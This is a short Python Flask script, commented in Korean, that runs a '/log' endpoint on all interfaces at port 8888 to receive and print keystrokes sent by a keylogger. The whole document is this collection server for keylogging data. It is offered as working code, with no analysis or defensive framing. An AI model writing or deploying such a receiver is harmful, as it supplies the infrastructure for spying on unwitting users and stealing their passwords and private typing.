from flask import Flask, request

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log_keys():
    keys = request.form.get('keys')
    if keys:
        # 키로깅 데이터를 저장하거나 다른 처리를 수행합니다.
        print('Received keys:', keys)
        return 'Keys received successfully'
    else:
        return 'No keys received'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
